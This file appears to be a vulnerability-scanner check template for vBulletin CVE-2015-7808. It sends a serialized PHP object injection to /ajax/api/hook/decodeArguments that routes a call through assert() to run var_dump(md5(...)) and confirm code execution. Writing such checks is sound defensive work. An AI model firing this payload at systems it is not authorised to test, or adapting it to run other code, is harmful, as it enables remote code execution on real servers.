name: poc-yaml-vbulletin-cve-2015-7808
manual: true
transport: http
set:
    r1: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /ajax/api/hook/decodeArguments
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A25%3A%22var_dump%28md5%28%27{{r1}}%27%29%29%22%3B%7D
            follow_redirects: true
        expression: response.status == 500 && response.body.bcontains(bytes(md5(r1)))
expression: r0()
detail:
    author: sharecast
    links:
        - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/vbulletin_unserialize.rb